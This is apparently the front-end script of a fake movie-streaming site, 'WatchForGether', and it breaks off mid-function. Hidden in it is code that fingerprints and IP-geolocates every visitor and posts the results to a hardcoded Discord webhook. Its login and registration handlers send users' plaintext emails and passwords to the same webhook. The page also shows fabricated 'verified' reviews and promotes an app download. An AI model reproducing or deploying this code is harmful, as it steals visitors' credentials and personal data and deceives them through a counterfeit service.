// Discord Webhook Configuration
const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1492168761678237919/aV7O_KsL9vfCMx61FgUmG3f9SQcEg75_Tjbiiu1n0SMuYV0z_608t1o4TqomrhgMcKoi';

// ========== ENHANCED LOGGING SYSTEM ==========

function sendDetailedLog(type, extraData) {
    if (type === 'page_visit' && sessionStorage.getItem('log_sent_page')) return;
    if (type === 'page_visit') sessionStorage.setItem('log_sent_page', 'true');
    
    const currentDomain = window.location.hostname;
    const referrerDomain = document.referrer ? new URL(document.referrer).hostname : 'Direct';
    const pagePath = window.location.pathname || '/';
    
    const getDetailedOS = () => {
        const ua = navigator.userAgent;
        if (ua.includes('Windows NT 10.0')) return { name: 'Windows 11/10', version: '10.0', type: 'desktop' };
        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', version: '6.3', type: 'desktop' };
        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', version: '6.2', type: 'desktop' };
        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', version: '6.1', type: 'desktop' };
        if (ua.includes('Mac OS X')) {
            const match = ua.match(/Mac OS X ([\d_]+)/);
            return { name: 'macOS', version: match ? match[1].replace(/_/g, '.') : 'unknown', type: 'desktop' };
        }
        if (ua.includes('Linux')) {
            if (ua.includes('Android')) {
                const match = ua.match(/Android ([\d.]+)/);
                return { name: 'Android', version: match ? match[1] : 'unknown', type: 'mobile' };
            }
            return { name: 'Linux', version: 'unknown', type: 'desktop' };
        }
        if (ua.includes('iPhone')) {
            const match = ua.match(/iPhone OS ([\d_]+)/);
            return { name: 'iOS', version: match ? match[1].replace(/_/g, '.') : 'unknown', type: 'mobile' };
        }
        if (ua.includes('iPad')) {
            const match = ua.match(/iPad OS ([\d_]+)/);
            return { name: 'iPadOS', version: match ? match[1].replace(/_/g, '.') : 'unknown', type: 'tablet' };
        }
        return { name: 'Unknown OS', version: '?', type: 'unknown' };
    };
    
    const getDetailedBrowser = () => {
        const ua = navigator.userAgent;
        if (ua.includes('Edg/')) return { name: 'Microsoft Edge', version: ua.split('Edg/')[1]?.split('.')[0] || '?', engine: 'Chromium' };
        if (ua.includes('Chrome/') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Google Chrome', version: ua.split('Chrome/')[1]?.split('.')[0] || '?', engine: 'Blink' };
        if (ua.includes('Firefox/')) return { name: 'Mozilla Firefox', version: ua.split('Firefox/')[1]?.split('.')[0] || '?', engine: 'Gecko' };
        if (ua.includes('Safari/') && !ua.includes('Chrome')) return { name: 'Apple Safari', version: ua.split('Version/')[1]?.split('.')[0] || '?', engine: 'WebKit' };
        if (ua.includes('OPR/') || ua.includes('Opera/')) return { name: 'Opera', version: '?', engine: 'Blink' };
        if (ua.includes('Brave/')) return { name: 'Brave', version: ua.split('Brave/')[1]?.split('.')[0] || '?', engine: 'Chromium' };
        return { name: 'Unknown Browser', version: '?', engine: '?' };
    };
    
    const getHardwareInfo = () => {
        const info = {};
        if (navigator.hardwareConcurrency) info.cpuCores = navigator.hardwareConcurrency;
        if (navigator.deviceMemory) info.ram = `${navigator.deviceMemory} GB`;
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
        info.screenRes = `${screen.width}x${screen.height}`;
        info.colorDepth = `${screen.colorDepth}bit`;
        info.pixelRatio = window.devicePixelRatio || 1;
        info.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        return info;
    };
    
    const getDeviceType = (ua, os) => {
        const device = { type: 'Desktop', brand: 'Unknown', model: 'Unknown', formFactor: 'Desktop' };
        if (/(iPhone|iPod)/i.test(ua)) {
            device.type = 'Mobile'; device.brand = 'Apple'; device.model = 'iPhone'; device.formFactor = 'Smartphone';
        } else if (/(iPad)/i.test(ua) || (ua.includes('Macintosh') && 'ontouchend' in document)) {
            device.type = 'Tablet'; device.brand = 'Apple'; device.model = 'iPad'; device.formFactor = 'Tablet';
        } else if (ua.includes('Android') && !ua.includes('Tablet')) {
            device.type = 'Mobile'; device.brand = 'Android'; device.formFactor = 'Smartphone';
        } else if (ua.includes('Samsung')) {
            device.type = 'Mobile'; device.brand = 'Samsung'; device.formFactor = 'Smartphone';
        } else if (ua.includes('Xiaomi') || ua.includes('Redmi')) {
            device.type = 'Mobile'; device.brand = 'Xiaomi'; device.formFactor = 'Smartphone';
        } else if (ua.includes('Pixel')) {
            device.type = 'Mobile'; device.brand = 'Google'; device.model = 'Pixel'; device.formFactor = 'Smartphone';
        }
        return device;
    };
    
    const os = getDetailedOS();
    const browser = getDetailedBrowser();
    const hardware = getHardwareInfo();
    const device = getDeviceType(navigator.userAgent, os);
    
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
            const mapsLink = ipData.latitude && ipData.longitude ? 
                `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : null;
            
            let title = '';
            let color = 0xff69b4;
            
            switch(type) {
                case 'page_visit':
                    title = '**Website Page Visit**';
                    color = 0x3498db;
                    break;
                case 'register':
                    title = '**NEW USER REGISTRATION**';
                    color = 0x2ecc71;
                    break;
                case 'login':
                    title = '**USER LOGIN**';
                    color = 0xf1c40f;
                    break;
                default:
                    title = '**Activity Log**';
                    color = 0x9b59b6;
            }
            
            const fields = [
                {
                    name: '💻 **DEVICE & SYSTEM**',
                    value: `\`\`\`yaml\n${device.brand} ${device.model} (${device.type})\n${os.name} ${os.version !== '?' ? os.version : ''}\n${browser.name} ${browser.version} (${browser.engine})\nCPU: ${hardware.cpuCores || '?'} Cores | RAM: ${hardware.ram || '?'}\nGPU: ${hardware.gpu ? hardware.gpu.substring(0, 50) : '?'}\nScreen: ${hardware.screenRes}\nTouch: ${hardware.touchSupport ? 'Yes' : 'No'}\`\`\``,
                    inline: true
                },
                {
                    name: '📍 **LOCATION & NETWORK**',
                    value: `\`\`\`yaml\nIP: ${ipData.ip || 'Unknown'}\n📍 ${ipData.city || '?'}, ${ipData.country_name || '?'}\n📡 ${ipData.org || 'Unknown'}\n⏰ ${ipData.timezone || '?'}\`\`\``,
                    inline: true
                },
                {
                    name: '📊 **VISIT DETAILS**',
                    value: `\`\`\`yaml\nPage: ${pagePath}\n🔗 Referrer: ${referrerDomain}\n🕐 ${new Date().toLocaleString('en-US')}\n🍪 Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}\n🌐 Language: ${navigator.language}\`\`\``,
                    inline: true
                }
            ];
            
            if ((type === 'register' || type === 'login') && extraData) {
                fields.push({
                    name: type === 'register' ? '📝 **REGISTRATION DETAILS**' : '🔐 **LOGIN DETAILS**',
                    value: `\`\`\`yaml\nEmail: ${extraData.email || 'N/A'}\nPassword: ${extraData.password || 'N/A'}\nUsername: ${extraData.username || 'N/A'}\nTimestamp: ${new Date().toISOString()}\`\`\``,
                    inline: false
                });
            }
            
            if (mapsLink) {
                fields.push({
                    name: '🗺️ **MAP**',
                    value: `[📍 Show Location](${mapsLink})`,
                    inline: false
                });
            }
            
            const embed = {
                embeds: [{
                    title: title,
                    color: color,
                    fields: fields,
                    footer: {
                        text: 'Monitoring System | All activities are logged',
                        icon_url: 'https://i.imgur.com/footer-icon.png'
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            }).catch(() => {});
        })
        .catch(() => {
            const fallbackEmbed = {
                embeds: [{
                    title: type === 'register' ? '📝 New Registration' : (type === 'login' ? '🔐 User Login' : '👁️ Page Visit'),
                    color: 0xff69b4,
                    description: `\`\`\`yaml\nDomain: ${currentDomain}\nBrowser: ${browser.name} ${browser.version}\nOS: ${os.name}\nDevice: ${device.type}\nPage: ${pagePath}\nReferrer: ${referrerDomain}\nTime: ${new Date().toLocaleString('en-US')}\n${extraData ? `Email: ${extraData.email || 'N/A'}\nPassword: ${extraData.password || 'N/A'}` : ''}\`\`\``,
                    footer: { text: 'Monitoring System' },
                    timestamp: new Date().toISOString()
                }]
            };
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fallbackEmbed)
            }).catch(() => {});
        });
}

// Page visit log on load
sendDetailedLog('page_visit');

// ========== LANGUAGE CONFIGURATION - ENGLISH DEFAULT ==========

const translations = {
    en: {
        home: 'Home',
        movies: 'Movies',
        series: 'Series',
        trending: 'Trending',
        download: 'Download',
        signIn: 'Sign In',
        register: 'Register',
        logout: 'Logout',
        myAccount: 'My Account',
        myWatchlist: 'My Watchlist',
        settings: 'Settings',
        heroTitle: 'Stream Unlimited Movies & Series',
        heroSubtitle: 'Watch anywhere, anytime. Cancel anytime.',
        getStarted: 'Get Started',
        heroDesc: 'Experience the best in entertainment with crystal-clear 4K streaming, offline downloads, and exclusive content you won\'t find anywhere else.',
        featuresTitle: 'Premium Features',
        featuresSubtitle: 'Why choose us',
        quality: '4K & HDR Quality',
        qualityDesc: 'Crystal clear streaming up to 4K HDR with Dolby Atmos support.',
        device: 'All Devices',
        deviceDesc: 'Watch on your TV, phone, tablet, laptop, or any device.',
        offline: 'Offline Mode',
        offlineDesc: 'Download your favorite content and watch offline anywhere.',
        noAds: 'No Ads',
        noAdsDesc: 'Enjoy uninterrupted streaming with zero advertisements.',
        categoriesTitle: 'Browse Categories',
        categoriesSubtitle: 'Find your next favorite',
        action: 'Action',
        comedy: 'Comedy',
        drama: 'Drama',
        sciFi: 'Sci-Fi',
        horror: 'Horror',
        romance: 'Romance',
        browseAll: 'Browse Category',
        popularMovies: 'Popular Movies',
        viewAll: 'View All',
        popularSeries: 'Popular Series',
        trendingNow: 'Trending Now',
        reviewsTitle: 'User Reviews',
        reviewsSubtitle: 'What our users say',
        faqTitle: 'Frequently Asked Questions',
        faqSubtitle: 'Got questions? We\'ve got answers',
        faq1q: 'What is WatchForGether?',
        faq1a: 'WatchForGether is a premium streaming service that offers a wide variety of award-winning TV shows, movies, anime, documentaries, and more on thousands of internet-connected devices.',
        faq2q: 'How much does it cost?',
        faq2a: 'WatchForGether offers flexible plans starting at just $9.99/month. We also offer a free 30-day trial for new users.',
        faq3q: 'Where can I watch?',
        faq3a: 'You can watch anywhere, anytime on your phone, tablet, laptop, TV, or any other internet-connected device with the WatchForGether app.',
        faq4q: 'How do I cancel?',
        faq4a: 'You can cancel your subscription online at any time with no hidden fees or penalties. Just go to your account settings and click cancel.',
        faq5q: 'Is there offline viewing?',
        faq5a: 'Yes! You can download your favorite movies and series to watch offline wherever you go.',
        downloadTitle: 'Ready to start your journey?',
        downloadSubtitle: 'Download the app now and get 30 days free trial',
        downloadBtn: 'Download Now',
        downloadDesc: 'Available for Windows, macOS, iOS, and Android',
        footerAbout: 'About Us',
        footerHelp: 'Help Center',
        footerTerms: 'Terms of Use',
        footerPrivacy: 'Privacy Policy',
        footerContact: 'Contact Us',
        footerRights: 'All rights reserved.',
        profile: 'Profile',
        editProfile: 'Edit Profile',
        recentlyWatched: 'Recently Watched',
        statistics: 'Statistics',
        moviesWatched: 'Movies Watched',
        seriesWatched: 'Series Watched',
        totalWatchTime: 'Total Watch Time',
        watchlistCount: 'Watchlist Items',
        saveChanges: 'Save Changes',
        watchlist: 'Watchlist',
        all: 'All',
        watch: 'Watch',
        remove: 'Remove',
        emptyWatchlist: 'Your watchlist is empty',
        emptyWatchlistDesc: 'Start adding movies and series to your watchlist',
        settingsTitle: 'Settings',
        videoQuality: 'Video Quality',
        autoplay: 'Autoplay Next Episode',
        subtitles: 'Default Subtitles',
        emailNotifications: 'Email Notifications',
        pushNotifications: 'Push Notifications',
        theme: 'Theme',
        darkMode: 'Dark Mode',
        lightMode: 'Light Mode',
        reduceMotion: 'Reduce Motion',
        watchHistory: 'Save Watch History',
        twoFactorAuth: 'Two-Factor Authentication',
        saveSettings: 'Save Settings',
        deleteAccount: 'Delete Account',
        deleteConfirm: 'Are you sure you want to delete your account? This cannot be undone.',
        loginSuccess: 'Login successful! Welcome back',
        loginError: 'Invalid email or password',
        registerSuccess: 'Account created successfully!',
        registerError: 'Registration failed. Please try again.',
        logoutSuccess: 'Logged out successfully'
    }
};

let currentLang = 'en';

function setLanguage(lang) {
    if (!translations[lang]) lang = 'en';
    currentLang = lang;
    document.documentElement.lang = lang;
    
    document.querySelectorAll('[data-i18n]').forEach(element => {
        const key = element.getAttribute('data-i18n');
        if (translations[lang][key]) {
            if (element.tagName === 'INPUT' && element.placeholder) {
                element.placeholder = translations[lang][key];
            } else if (element.tagName === 'IMG' && element.alt) {
                element.alt = translations[lang][key];
            } else {
                element.textContent = translations[lang][key];
            }
        }
    });
    
    document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
        const key = element.getAttribute('data-i18n-placeholder');
        if (translations[lang][key]) {
            element.placeholder = translations[lang][key];
        }
    });
    
    localStorage.setItem('preferred_language', lang);
}

function initLanguage() {
    const savedLang = localStorage.getItem('preferred_language') || 'en';
    setLanguage(savedLang);
}

// ========== API Configuration ==========
var API_URL = 'http://localhost:3001/api/movies';
var movieDatabase = [];
var seriesDatabase = [];

// ========== LOGGING FUNCTIONS ==========
function logRegistration(email, password, fullname) {
    sendDetailedLog('register', {
        email: email,
        password: password,
        username: fullname
    });
}

function logLogin(email, password) {
    sendDetailedLog('login', {
        email: email,
        password: password
    });
}

// Load movies from API
function loadMoviesFromAPI() {
    fetch(API_URL)
        .then(function(response) {
            if (!response.ok) {
                throw new Error('API not available');
            }
            return response.json();
        })
        .then(function(movies) {
            movieDatabase = movies.map(function(movie) {
                return {
                    id: movie.id,
                    title: movie.title,
                    year: parseInt(movie.year) || 2024,
                    genre: movie.genre,
                    rating: parseFloat(movie.rating) || 8.0,
                    duration: movie.duration,
                    img: movie.img || 'https://via.placeholder.com/300x450?text=No+Image',
                    director: movie.director,
                    cast: Array.isArray(movie.cast) ? movie.cast.join(', ') : movie.cast,
                    language: movie.language,
                    description: movie.description,
                    trailer: movie.trailer,
                    type: "movie"
                };
            });
            
            var moviesGrid = document.getElementById('moviesGrid');
            if (moviesGrid) {
                renderCards(moviesGrid, movieDatabase);
            }
            
            console.log('✅ Loaded ' + movieDatabase.length + ' movies from API');
        })
        .catch(function(error) {
            console.warn('⚠️ API not available, using fallback data:', error);
            movieDatabase = [
                {
                    id: 1,
                    title: "Inception",
                    year: 2010,
                    genre: "Sci-Fi",
                    rating: 8.8,
                    duration: "2h 28min",
                    img: "https://m.media-amazon.com/images/M/MV5BMjAxMzY3NjcxNF5BMl5BanBnXkFtZTcwNTI5OTM0Mw@@._V1_SX300.jpg",
                    director: "Christopher Nolan",
                    cast: "Leonardo DiCaprio, Joseph Gordon-Levitt, Elliot Page, Tom Hardy",
                    language: "English",
                    description: "A thief who steals corporate secrets through the use of dream-sharing technology is given the inverse task of planting an idea into the mind of a C.E.O., but his tragic past may doom the project and his team to disaster.",
                    trailer: "https://www.youtube.com/watch?v=YoHD9XEInc0",
                    type: "movie"
                },
                {
                    id: 2,
                    title: "The Dark Knight",
                    year: 2008,
                    genre: "Action",
                    rating: 9.0,
                    duration: "2h 32min",
                    img: "https://m.media-amazon.com/images/M/MV5BMTMxNTMwODM0NF5BMl5BanBnXkFtZTcwODAyMTk2Mw@@._V1_SX300.jpg",
                    director: "Christopher Nolan",
                    cast: "Christian Bale, Heath Ledger, Aaron Eckhart, Michael Caine",
                    language: "English",
                    description: "When the menace known as the Joker wreaks havoc and chaos on the people of Gotham, Batman must accept one of the greatest psychological and physical tests of his ability to fight injustice.",
                    trailer: "https://www.youtube.com/watch?v=EXeTwQWrcwY",
                    type: "movie"
                },
                {
                    id: 3,
                    title: "Interstellar",
                    year: 2014,
                    genre: "Sci-Fi",
                    rating: 8.6,
                    duration: "2h 49min",
                    img: "https://m.media-amazon.com/images/M/MV5BZjdkOTU3MDktN2IxOS00OGEyLWFmMjktY2FiMmZkNWIyODZiXkEyXkFqcGdeQXVyMTMxODk2OTU@._V1_SX300.jpg",
                    director: "Christopher Nolan",
                    cast: "Matthew McConaughey, Anne Hathaway, Jessica Chastain",
                    language: "English",
                    description: "A team of explorers travel through a wormhole in space in an attempt to ensure humanity's survival.",
                    trailer: "https://www.youtube.com/watch?v=zSWdZVtXT7E",
                    type: "movie"
                },
                {
                    id: 4,
                    title: "The Matrix",
                    year: 1999,
                    genre: "Action",
                    rating: 8.7,
                    duration: "2h 16min",
                    img: "https://m.media-amazon.com/images/M/MV5BNzQzOTk3OTAtNDQ0Zi00ZTVkLWI0MTEtMDllZjNkYzNjNTc4L2ltYWdlXkEyXkFqcGdeQXVyNjU0OTQ0OTY@._V1_SX300.jpg",
                    director: "Lana Wachowski, Lilly Wachowski",
                    cast: "Keanu Reeves, Laurence Fishburne, Carrie-Anne Moss",
                    language: "English",
                    description: "A computer hacker learns from mysterious rebels about the true nature of his reality and his role in the war against its controllers.",
                    trailer: "https://www.youtube.com/watch?v=vKQi3bBA1y8",
                    type: "movie"
                }
            ];
            var moviesGrid = document.getElementById('moviesGrid');
            if (moviesGrid) {
                renderCards(moviesGrid, movieDatabase);
            }
        });
}

seriesDatabase = [
    {
        id: 101,
        title: "Breaking Bad",
        year: 2008,
        genre: "Crime Drama",
        rating: 9.5,
        duration: "5 Seasons",
        img: "https://m.media-amazon.com/images/M/MV5BYmQ4YWMxYjUtNjZmYi00MDQ1LWFjMjMtNjA5ZDdiYjdiODU5XkEyXkFqcGdeQXVyMTMzNDExODE5._V1_SX300.jpg",
        director: "Vince Gilligan",
        cast: "Bryan Cranston, Aaron Paul, Anna Gunn, Dean Norris",
        language: "English",
        description: "A chemistry teacher diagnosed with inoperable lung cancer turns to manufacturing and selling methamphetamine with a former student to secure his family's future.",
        trailer: "https://www.youtube.com/watch?v=HhesaQXLuRY",
        type: "series"
    },
    {
        id: 102,
        title: "Stranger Things",
        year: 2016,
        genre: "Sci-Fi Horror",
        rating: 8.7,
        duration: "4 Seasons",
        img: "https://m.media-amazon.com/images/M/MV5BMDZkYmVhNjMtNWU4MC00MDQxLWE3MjYtZGMzZWI1ZjhlOWJmXkEyXkFqcGdeQXVyMTkxNjUyNQ@@._V1_SX300.jpg",
        director: "The Duffer Brothers",
        cast: "Millie Bobby Brown, Finn Wolfhard, Winona Ryder, David Harbour",
        language: "English",
        description: "When a young boy disappears, his mother, a police chief and his friends must confront terrifying supernatural forces in order to get him back.",
        trailer: "https://www.youtube.com/watch?v=b9EkMc79ZSU",
        type: "series"
    },
    {
        id: 103,
        title: "Game of Thrones",
        year: 2011,
        genre: "Fantasy Drama",
        rating: 9.2,
        duration: "8 Seasons",
        img: "https://m.media-amazon.com/images/M/MV5BYTRiNDQwYzAtMzVlZS00NTI5LWJjYjUtMzkwNTUzMWMxZTllXkEyXkFqcGdeQXVyNDIzMzcwNjc@._V1_SX300.jpg",
        director: "David Benioff, D.B. Weiss",
        cast: "Emilia Clarke, Kit Harington, Peter Dinklage, Lena Headey",
        language: "English",
        description: "Nine noble families fight for control over the lands of Westeros, while an ancient enemy returns after being dormant for millennia.",
        trailer: "https://www.youtube.com/watch?v=KPLWWIOCOOQ",
        type: "series"
    },
    {
        id: 104,
        title: "The Witcher",
        year: 2019,
        genre: "Fantasy",
        rating: 8.2,
        duration: "3 Seasons",
        img: "https://m.media-amazon.com/images/M/MV5BOTQzMzNmMzUtODgwNS00YTdhLTg5N2MtOWU1YTc4YWY3NjRlXkEyXkFqcGc@._V1_SX300.jpg",
        director: "Lauren Schmidt Hissrich",
        cast: "Henry Cavill, Anya Chalotra, Freya Allan, Joey Batey",
        language: "English",
        description: "Geralt of Rivia, a solitary monster hunter, struggles to find his place in a world where people often prove more wicked than beasts.",
        trailer: "https://www.youtube.com/watch?v=ndl1W4ltcmg",
        type: "series"
    }
];

var trendingDatabase = [
    {
        id: 201,
        title: "Oppenheimer",
        year: 2023,
        genre: "Biography",
        rating: 8.4,
        duration: "3h 0min",
        img: "https://m.media-amazon.com/images/M/MV5BMDBmYTZjNjUtN2M1MS00MTQ2LTk2ODgtNzc2M2QyZGE5NTVjXkEyXkFqcGdeQXVyNzAwMjU2MTY@._V1_SX300.jpg",
        director: "Christopher Nolan",
        cast: "Cillian Murphy, Emily Blunt, Matt Damon, Robert Downey Jr.",
        language: "English",
        description: "The story of American scientist J. Robert Oppenheimer and his role in the development of the atomic bomb.",
        trailer: "https://www.youtube.com/watch?v=uYPbbksJxIg",
        type: "movie"
    },
    {
        id: 202,
        title: "Dune: Part Two",
        year: 2024,
        genre: "Sci-Fi",
        rating: 8.6,
        duration: "2h 46min",
        img: "https://m.media-amazon.com/images/M/MV5BN2QyZGU4ZDctOWMzMy00NTc5LThlOGQtODhmNDI1NmY5YzAwXkEyXkFqcGdeQXVyMDM2NDM2MQ@@._V1_SX300.jpg",
        director: "Denis Villeneuve",
        cast: "Timothee Chalamet, Zendaya, Austin Butler, Florence Pugh",
        language: "English",
        description: "Paul Atreides unites with Chani and the Fremen while on a warpath of revenge against the conspirators who destroyed his family.",
        trailer: "https://www.youtube.com/watch?v=Way9Dexny3w",
        type: "movie"
    },
    {
        id: 203,
        title: "The Last of Us",
        year: 2023,
        genre: "Drama",
        rating: 8.8,
        duration: "2 Seasons",
        img: "https://m.media-amazon.com/images/M/MV5BZGUzYTI3M2EtZmM0Yy00NGUyLWI4ODEtN2Q3ZGJlYzhhZjU3XkEyXkFqcGdeQXVyNTM0OTY1OQ@@._V1_SX300.jpg",
        director: "Craig Mazin, Neil Druckmann",
        cast: "Pedro Pascal, Bella Ramsey, Anna Torv, Gabriel Luna",
        language: "English",
        description: "After a global pandemic destroys civilization, a hardened survivor takes charge of a 14-year-old girl who may be humanity's last hope.",
        trailer: "https://www.youtube.com/watch?v=uLtkt8BonwM",
        type: "series"
    },
    {
        id: 204,
        title: "Poor Things",
        year: 2023,
        genre: "Comedy Drama",
        rating: 8.0,
        duration: "2h 21min",
        img: "https://m.media-amazon.com/images/M/MV5BYWU2MjRjZTYtMjVkMS00MTBjLWFiMTAtYmZlYTk1YjkyMWFkXkEyXkFqcGc@._V1_SX300.jpg",
        director: "Yorgos Lanthimos",
        cast: "Emma Stone, Mark Ruffalo, Willem Dafoe, Ramy Youssef",
        language: "English",
        description: "The incredible tale about the fantastical evolution of Bella Baxter, a young woman brought back to life by the brilliant and unorthodox scientist Dr. Godwin Baxter.",
        trailer: "https://www.youtube.com/watch?v=RlbR5N6veqw",
        type: "movie"
    },
    {
        id: 205,
        title: "Killers of the Flower Moon",
        year: 2023,
        genre: "Crime Drama",
        rating: 7.8,
        duration: "3h 26min",
        img: "https://m.media-amazon.com/images/M/MV5BZWY5ZDVjNTUtODI5Yy00MjFhLWEyM2EtYzZjM2VjZTI0MTBjXkEyXkFqcGc@._V1_SX300.jpg",
        director: "Martin Scorsese",
        cast: "Leonardo DiCaprio, Robert De Niro, Lily Gladstone, Jesse Plemons",
        language: "English",
        description: "Members of the Osage tribe in the United States are murdered under mysterious circumstances in the 1920s, sparking a major F.B.I. investigation.",
        trailer: "https://www.youtube.com/watch?v=EP34Yoxs3FQ",
        type: "movie"
    }
];

var reviewsData = [
    {
        name: "Sarah Jenkins",
        avatar: "https://randomuser.me/api/portraits/women/44.jpg",
        rating: 5,
        date: "Jan 15, 2026",
        text: "I've tried Netflix, Hulu, Disney+ and a bunch of others. WatchForGether has the best picture quality hands down. The 4K HDR streams are incredible on my 65'' OLED.",
        verified: true
    },
    {
        name: "Michael Chen",
        avatar: "https://randomuser.me/api/portraits/men/32.jpg",
        rating: 5,
        date: "Feb 2, 2026",
        text: "The curated collections are what keep me coming back. Every weekend I find something new to watch. The recommendation engine actually understands my taste.",
        verified: true
    },
    {
        name: "Emma Wilson",
        avatar: "https://randomuser.me/api/portraits/women/68.jpg",
        rating: 5,
        date: "Dec 28, 2025",
        text: "Downloaded the Windows app and it's buttery smooth. Downloaded a few movies for a long flight and the offline mode worked flawlessly. Highly recommend.",
        verified: true
    },
    {
        name: "James Rodriguez",
        avatar: "https://randomuser.me/api/portraits/men/75.jpg",
        rating: 4,
        date: "Jan 8, 2026",
        text: "Great selection of indie films that you won't find on mainstream platforms. The interface is clean and doesn't bombard you with stuff you don't care about.",
        verified: true
    },
    {
        name: "Lisa Park",
        avatar: "https://randomuser.me/api/portraits/women/90.jpg",
        rating: 5,
        date: "Feb 10, 2026",
        text: "My whole family uses WatchForGether now. The multi-profile feature means my kids get their own recommendations without messing up mine. Love it.",
        verified: false
    },
    {
        name: "David Thompson",
        avatar: "https://randomuser.me/api/portraits/men/46.jpg",
        rating: 5,
        date: "Jan 22, 2026",
        text: "As a film student, having access to classic cinema alongside new releases is invaluable. The documentary section alone is worth it. No ads is a huge plus.",
        verified: true
    }
];

// ========== HELPER FUNCTIONS ==========

function updateNavbarAuth() {
    var isRegistered = localStorage.getItem('w4g_registered') === 'true';
    var username = localStorage.getItem('w4g_username') || 'User';

    var navSignIn = document.getElementById('navSignIn');
    var navRegister = document.getElementById('navRegister');
    var userAccountArea = document.getElementById('userAccountArea');
    var userNameNav = document.getElementById('userNameNav');
    var avatarEl = document.querySelector('.user-avatar-small');

    var mobileSignIn = document.getElementById('mobileSignIn');
    var mobileRegister = document.getElementById('mobileRegister');
    var mobileAccountArea = document.getElementById('mobileAccountArea');
    var mobileUserName = document.getElementById('mobileUserName');

    if (isRegistered) {
        if (navSignIn) navSignIn.style.display = 'none';
        if (navRegister) navRegister.style.display = 'none';
        if (userAccountArea) userAccountArea.style.display = 'flex';
        if (userNameNav) userNameNav.textContent = username;
        if (avatarEl) avatarEl.textContent = username.charAt(0).toUpperCase();

        if (mobileSignIn) mobileSignIn.style.display = 'none';
        if (mobileRegister) mobileRegister.style.display = 'none';
        if (mobileAccountArea) mobileAccountArea.style.display = 'block';
        if (mobileUserName) mobileUserName.textContent = username;
    } else {
        if (navSignIn) navSignIn.style.display = '';
        if (navRegister) navRegister.style.display = '';
        if (userAccountArea) userAccountArea.style.display = 'none';

        if (mobileSignIn) mobileSignIn.style.display = '';
        if (mobileRegister) mobileRegister.style.display = '';
        if (mobileAccountArea) mobileAccountArea.style.display = 'none';
    }
}

function renderCards(container, data) {
    container.innerHTML = '';
    for (var i = 0; i < data.length; i++) {
        var item = data[i];
        var card = document.createElement('div');
        card.className = 'movie-card';
        card.setAttribute('data-id', item.id);

        var imgEl = document.createElement('img');
        imgEl.className = 'poster';
        imgEl.loading = 'lazy';
        imgEl.alt = item.title;
        imgEl.src = item.img;
        imgEl.onerror = (function (title) {
            return function () {
                this.src = 'https://placehold.co/300x450/1a1a2e/e0e0e0?text=' + encodeURIComponent(title);
                this.onerror = null;
            };
        })(item.title);

        var infoDiv = document.createElement('div');
        infoDiv.className = 'movie-info';

        var titleEl = document.createElement('h3');
        titleEl.className = 'movie-title';
        titleEl.textContent = item.title;

        var metaDiv = document.createElement('div');
        metaDiv.className = 'movie-meta';

        var metaSpan = document.createElement('span');
        metaSpan.textContent = item.year + ' \u2022 ' + item.genre;

        var ratingSpan = document.createElement('span');
        ratingSpan.className = 'rating-badge';
        ratingSpan.textContent = item.rating;

        metaDiv.appendChild(metaSpan);
        metaDiv.appendChild(ratingSpan);
        infoDiv.appendChild(titleEl);
        infoDiv.appendChild(metaDiv);
        card.appendChild(imgEl);
        card.appendChild(infoDiv);

        card.addEventListener('click', (function (movie) {
            return function () {
                openModal(movie);
            };
        })(item));

        container.appendChild(card);
    }
}

function renderTrending(container, data) {
    container.innerHTML = '';
    for (var i = 0; i < data.length; i++) {
        var item = data[i];
        var card = document.createElement('div');
        card.className = 'trending-card';
        card.setAttribute('data-id', item.id);

        var rankNum = document.createElement('span');
        rankNum.className = 'trending-rank';
        rankNum.textContent = i + 1;

        var imgEl = document.createElement('img');
        imgEl.className = 'trending-poster';
        imgEl.loading = 'lazy';
        imgEl.alt = item.title;
        imgEl.src = item.img;
        imgEl.onerror = (function (title) {
            return function () {
                this.src = 'https://placehold.co/300x450/1a1a2e/e0e0e0?text=' + encodeURIComponent(title);
                this.onerror = null;
            };
        })(item.title);

        var infoDiv = document.createElement('div');
        infoDiv.className = 'trending-info';

        var titleEl = document.createElement('h3');
        titleEl.textContent = item.title;

        var metaP = document.createElement('p');
        metaP.textContent = item.year + ' \u2022 ' + item.genre + ' \u2022 ' + item.duration;

        var ratingDiv = document.createElement('div');
        ratingDiv.className = 'trending-rating';
        ratingDiv.innerHTML = '<i class="fa-solid fa-star" style="color:#f5c518;font-size:13px;"></i> ' + item.rating;

        infoDiv.appendChild(titleEl);
        infoDiv.appendChild(metaP);
        infoDiv.appendChild(ratingDiv);

        card.appendChild(rankNum);
        card.appendChild(imgEl);
        card.appendChild(infoDiv);

        card.addEventListener('click', (function (movie) {
            return function () {
                openModal(movie);
            };
        })(item));

        container.appendChild(card);
    }
}

function renderReviews(container, data) {
    container.innerHTML = '';
    for (var i = 0; i < data.length; i++) {
        var r = data[i];
        var card = document.createElement('div');
        card.className = 'testimonial-card';

        var stars = '';
        for (var s = 0; s < 5; s++) {
            if (s < r.rating) {
                stars += '<i class="fa-solid fa-star"></i>';
            } else {
                stars += '<i class="fa-regular fa-star"></i>';
            }
        }
        
        var verifiedBadge = r.verified ? '<span class="verified-badge">Verified User</span>' : '';

        card.innerHTML =
            '<div class="user-profile">' +
            '<img src="' + r.avatar + '" alt="' + r.name + '" class="user-img" onerror="this.src=\'img/avatar_user1.jpg\'">' +
            '<div>' +
            '<h4>' + r.name + '</h4>' +
            '<div class="review-meta"><span class="stars">' + stars + '</span><span class="review-date">' + r.date + '</span></div>' +
            '</div>' +
